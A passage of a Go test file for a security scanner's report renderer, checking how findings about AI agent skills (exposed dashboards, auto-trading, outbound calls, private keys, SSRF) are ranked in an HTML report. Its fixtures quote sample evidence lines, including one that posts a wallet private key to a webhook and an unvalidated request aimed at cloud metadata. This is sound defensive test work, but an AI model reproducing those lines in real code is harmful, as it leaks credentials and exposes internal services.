			RuleID:     "V7-021",
			Title:      "仪表板未鉴权暴露",
			Severity:   "高风险",
			Category:   "暴露面与未鉴权服务",
			AttackPath: "管理面当前更接近本地开发或单机运维入口",
			Evidence:   []string{"dashboard.py:12 app.run(host=\"127.0.0.1\", port=8080)"},
			Source:     "static-rule",
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "confirmed", Confidence: "高"}, {FindingID: "SF-002", Verdict: "needs_manual_review", Confidence: "中"}},
	}
	html := renderStructuredFindingsSection(refined)
	publicStart := strings.Index(html, "<strong>SF-001 / 仪表板未鉴权暴露</strong>")
	publicSection := html[publicStart : strings.Index(html[publicStart:], "</details>")+publicStart]
	if !strings.Contains(publicSection, ">高风险<") {
		t.Fatalf("expected public dashboard rendered as high severity, got %q", publicSection)
	}
	loopbackStart := strings.Index(html, "<strong>SF-002 / 仪表板未鉴权暴露</strong>")
	loopbackSection := html[loopbackStart : strings.Index(html[loopbackStart:], "</details>")+loopbackStart]
	if !strings.Contains(loopbackSection, ">低风险<") {
		t.Fatalf("expected loopback dashboard rendered as low severity, got %q", loopbackSection)
	}
}

func TestRenderStructuredFindingCardUsesNormalizedSeverityForAutoTrading(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:         "SF-001",
			RuleID:     "LLM-DETECT",
			Title:      "自动交易资金风险需复核",
			Severity:   "中风险",
			Category:   "业务自动化高风险行为",
			AttackPath: "技能具备自动构造并提交订单的能力",
			Evidence:   []string{"polymarket.py:201 signed_order = self.client.create_order(order_args)", "agent.yaml:8 live trading enabled"},
			Source:     "static-rule",
		}, {
			ID:         "SF-002",
			RuleID:     "LLM-DETECT",
			Title:      "自动交易资金风险需复核",
			Severity:   "高风险",
			Category:   "业务自动化高风险行为",
			AttackPath: "市场查询路径仍需人工复核",
			Evidence:   []string{"polymarket.py:220 response = requests.get(f\"{GAMMA_API}/markets\")"},
			Source:     "static-rule",
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "confirmed", Confidence: "高"}, {FindingID: "SF-002", Verdict: "needs_manual_review", Confidence: "中"}},
	}
	html := renderStructuredFindingsSection(refined)
	tradeStart := strings.Index(html, "<strong>SF-001 / 自动交易资金风险需复核</strong>")
	tradeSection := html[tradeStart : strings.Index(html[tradeStart:], "</details>")+tradeStart]
	if !strings.Contains(tradeSection, ">高风险<") {
		t.Fatalf("expected real auto-trading finding rendered as high severity, got %q", tradeSection)
	}
	queryStart := strings.Index(html, "<strong>SF-002 / 自动交易资金风险需复核</strong>")
	querySection := html[queryStart : strings.Index(html[queryStart:], "</details>")+queryStart]
	if !strings.Contains(querySection, ">低风险<") {
		t.Fatalf("expected market-query-only finding rendered as low severity, got %q", querySection)
	}
}

func TestRenderStructuredFindingCardUsesNormalizedSeverityForOutboundAndDeclarationMismatch(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:         "SF-001",
			RuleID:     "V7-003",
			Title:      "已声明外联回传",
			Severity:   "高风险",
			Category:   "外联与情报",
			AttackPath: "固定售后平台外联回传",
			Evidence:   []string{"agent.py:18 requests.post('https://after-sales.example.com/logs', json={'vin': vin})"},
			Source:     "static-rule",
		}, {
			ID:         "SF-002",
			RuleID:     "V7-006",
			Title:      "技能声明与实际行为一致性",
			Severity:   "中风险",
			Category:   "声明与行为差异",
			AttackPath: "声明未提及真实自动下单能力",
			Evidence:   []string{"polymarket.py:201 signed_order = self.client.create_order(order_args)"},
			Source:     "llm-review",
		}, {
			ID:         "SF-003",
			RuleID:     "V7-006",
			Title:      "技能声明与实际行为一致性",
			Severity:   "高风险",
			Category:   "声明与行为差异",
			AttackPath: "声明文本仍需补充说明",
			Evidence:   []string{"SKILL.md:8 声明能力: 市场监控与状态展示"},
			Source:     "llm-review",
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "needs_manual_review", Confidence: "中"}, {FindingID: "SF-002", Verdict: "confirmed", Confidence: "高"}, {FindingID: "SF-003", Verdict: "needs_manual_review", Confidence: "中"}},
	}
	html := renderStructuredFindingsSection(refined)
	outboundStart := strings.Index(html, "<strong>SF-001 / 已声明外联回传</strong>")
	outboundSection := html[outboundStart : strings.Index(html[outboundStart:], "</details>")+outboundStart]
	if !strings.Contains(outboundSection, ">低风险<") {
		t.Fatalf("expected fixed declared outbound rendered as low severity, got %q", outboundSection)
	}
	highDeclStart := strings.Index(html, "<strong>SF-002 / 技能声明与实际行为一致性</strong>")
	highDeclSection := html[highDeclStart : strings.Index(html[highDeclStart:], "</details>")+highDeclStart]
	if !strings.Contains(highDeclSection, ">高风险<") {
		t.Fatalf("expected undeclared high-risk capability rendered as high severity, got %q", highDeclSection)
	}
	lowDeclStart := strings.Index(html, "<strong>SF-003 / 技能声明与实际行为一致性</strong>")
	lowDeclSection := html[lowDeclStart : strings.Index(html[lowDeclStart:], "</details>")+lowDeclStart]
	if !strings.Contains(lowDeclSection, ">低风险<") {
		t.Fatalf("expected generic declaration mismatch rendered as low severity, got %q", lowDeclSection)
	}
}

func TestRenderStructuredFindingCardUsesNormalizedSeverityForCredentialAndSSRF(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:         "SF-001",
			RuleID:     "V7-004",
			Title:      "私钥明文存储风险",
			Severity:   "中风险",
			Category:   "凭据暴露",
			AttackPath: "凭据参与真实外联",
			Evidence:   []string{"auth.py:18 requests.post(webhook, json={'private_key': wallet_private_key})"},
			Source:     "static-rule",
		}, {
			ID:         "SF-002",
			RuleID:     "V7-004",
			Title:      "私钥明文存储风险",
			Severity:   "高风险",
			Category:   "凭据暴露",
			AttackPath: "development placeholder",
			Evidence:   []string{"config/dev.yaml:4 wallet_private_key: ''"},
			Source:     "static-rule",
		}, {
			ID:         "SF-003",
			RuleID:     "S2-P1-012",
			Title:      "SSRF-内网探测",
			Severity:   "中风险",
			Category:   "网络请求与SSRF",
			AttackPath: "危险目标=metadata.google；来源类型=user_input；缺少校验=missing-guard",
			Evidence:   []string{"api.py:12 resp = requests.get(target_url)"},
			Source:     "static-rule",
		}, {
			ID:         "SF-004",
			RuleID:     "S2-P1-012",
			Title:      "SSRF-内网探测",
			Severity:   "高风险",
			Category:   "网络请求与SSRF",
			AttackPath: "development callback allowlist",
			Evidence:   []string{"api.py:18 allowed_hosts = {'localhost'}"},
			Source:     "static-rule",
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "confirmed", Confidence: "高"}, {FindingID: "SF-002", Verdict: "needs_manual_review", Confidence: "中"}, {FindingID: "SF-003", Verdict: "confirmed", Confidence: "高"}, {FindingID: "SF-004", Verdict: "needs_manual_review", Confidence: "中"}},
	}
	html := renderStructuredFindingsSection(refined)
	highCredStart := strings.Index(html, "<strong>SF-001 / 私钥明文存储风险</strong>")
	highCredSection := html[highCredStart : strings.Index(html[highCredStart:], "</details>")+highCredStart]
	if !strings.Contains(highCredSection, ">高风险<") {
		t.Fatalf("expected active credential use rendered as high severity, got %q", highCredSection)
	}
	lowCredStart := strings.Index(html, "<strong>SF-002 / 私钥明文存储风险</strong>")
	lowCredSection := html[lowCredStart : strings.Index(html[lowCredStart:], "</details>")+lowCredStart]
	if !strings.Contains(lowCredSection, ">低风险<") {
		t.Fatalf("expected dev placeholder credential finding rendered as low severity, got %q", lowCredSection)
	}
	highSSRFStart := strings.Index(html, "<strong>SF-003 / SSRF-内网探测</strong>")
	highSSRFSection := html[highSSRFStart : strings.Index(html[highSSRFStart:], "</details>")+highSSRFStart]
	if !strings.Contains(highSSRFSection, ">高风险<") {
		t.Fatalf("expected metadata SSRF rendered as high severity, got %q", highSSRFSection)
	}
	lowSSRFStart := strings.Index(html, "<strong>SF-004 / SSRF-内网探测</strong>")
	lowSSRFSection := html[lowSSRFStart : strings.Index(html[lowSSRFStart:], "</details>")+lowSSRFStart]
	if !strings.Contains(lowSSRFSection, ">低风险<") {
		t.Fatalf("expected local allowlist SSRF rendered as low severity, got %q", lowSSRFSection)
	}
}

func TestRenderStructuredFindingsSectionPolymarketMixedScenarioMovesDocumentationFindingToSecondary(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{
			{ID: "SF-001", RuleID: "V7-005", Title: "许可证本地默认服务需复核", Severity: "高风险", Category: "授权与许可证校验", Confidence: "中", Evidence: []string{"scripts/polymarket.py:16 LICENSE_SERVER = os.getenv(\"LICENSE_SERVER\", \"http://localhost:8080\")"}, CalibrationBasis: []string{"本地 fallback 仅用于开发态，生成期已降为低风险。"}, SecurityVerdict: "review", Source: "static-rule"},
			{ID: "SF-002", RuleID: "V7-021", Title: "仪表板未鉴权暴露", Severity: "高风险", Category: "暴露面与未鉴权服务", Confidence: "中", Evidence: []string{"scripts/dashboard.py:88 app.run(host=\"127.0.0.1\", port=8080)"}, CalibrationBasis: []string{"本地 loopback dashboard，生成期已降为低风险。"}, SecurityVerdict: "review", Source: "static-rule"},
			{ID: "SF-003", RuleID: "V7-004", Title: "私钥明文存储风险", Severity: "高风险", Category: "凭据暴露", Confidence: "高", Evidence: []string{"scripts/polymarket.py:188 requests.post(webhook, json={'private_key': wallet_private_key})"}, CalibrationBasis: []string{"凭据进入真实外联执行链。"}, SecurityVerdict: "confirmed", Source: "static-rule"},
			{ID: "SF-004", RuleID: "V7-022", Title: "Python 系统包安装风险", Severity: "高风险", Category: "环境与构建风险", Confidence: "中", Evidence: []string{"scripts/bootstrap.sh:12 pip3 install -r requirements.txt --break-system-packages"}, CalibrationBasis: []string{"宿主环境安装系统包，保留中风险。"}, SecurityVerdict: "review", Source: "static-rule"},
			{ID: "SF-005", RuleID: "V7-003", Title: "敏感数据外发与隐蔽通道", Severity: "高风险", Category: "外联与情报", Confidence: "待复核", Evidence: []string{"examples/demo_agent.py:12 requests.post(webhook, json={'content': msg})"}, CalibrationBasis: []string{"当前证据主要位于文档、示例、测试或开发态上下文，优先按低优先级线索处理并保留人工复核。"}, SecurityVerdict: "review", FalsePositiveChecks: []string{"确认该示例文件不会进入发布包或被动态加载。"}, Source: "llm-review"},
		},
		FalsePositiveReviews: []review.FalsePositiveReview{{
			FindingID:          "SF-005",
			Verdict:            "待人工复核: 当前证据仍需确认是否进入真实发布链路。",
			EvidenceStrength:   "弱: 证据主要来自示例目录。",
			ReachabilityChecks: []string{"当前证据主要位于文档、示例或测试上下文，需优先确认该文件是否会进入发布包、运行镜像或动态加载链路。"},
			ExclusionChecks:    []string{"确认该示例文件不会进入发布包或被动态加载。"},
			RequiredFollowUp:   []string{"补充发布物清单或构建产物证明，确认文档、示例或测试内容不会进入真实运行链路。"},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-003", Verdict: "confirmed", Confidence: "高"}, {FindingID: "SF-005", Verdict: "needs_manual_review", Confidence: "中"}},
	}
	html := renderStructuredFindingsSection(refined)
	if !strings.Contains(html, "展开低优先级文档与交付提示（1 条）") {
		t.Fatalf("expected secondary disclosure toggle, got %q", html)
	}
	primaryStart := strings.Index(html, "<strong>SF-003 / 私钥明文存储风险</strong>")
	if primaryStart == -1 {
		t.Fatalf("expected active credential finding rendered in primary area, got %q", html)
	}
	primarySection := html[primaryStart : strings.Index(html[primaryStart:], "</details>")+primaryStart]
	if !strings.Contains(primarySection, ">高风险<") {
		t.Fatalf("expected runtime credential finding kept as high severity, got %q", primarySection)
	}
	secondaryStart := strings.Index(html, "<strong>SF-005 / 敏感数据外发与隐蔽通道</strong>")
	if secondaryStart == -1 {
		t.Fatalf("expected documentation finding rendered, got %q", html)
	}
	secondarySection := html[secondaryStart : strings.Index(html[secondaryStart:], "</details>")+secondaryStart]
	for _, want := range []string{">低风险<", "安全结论: 需人工复核", "当前证据主要位于文档、示例、测试或开发态上下文", "待人工复核: 当前证据仍需确认是否进入真实发布链路。", "确认该示例文件不会进入发布包或被动态加载。"} {
		if !strings.Contains(secondarySection, want) {
			t.Fatalf("expected secondary section contains %q, got %q", want, secondarySection)
		}
	}
	secondaryToggleIndex := strings.Index(html, "展开低优先级文档与交付提示（1 条）")
	if secondaryToggleIndex == -1 || secondaryStart < secondaryToggleIndex {
		t.Fatalf("expected documentation finding placed after secondary toggle, got %q", html)
	}
}
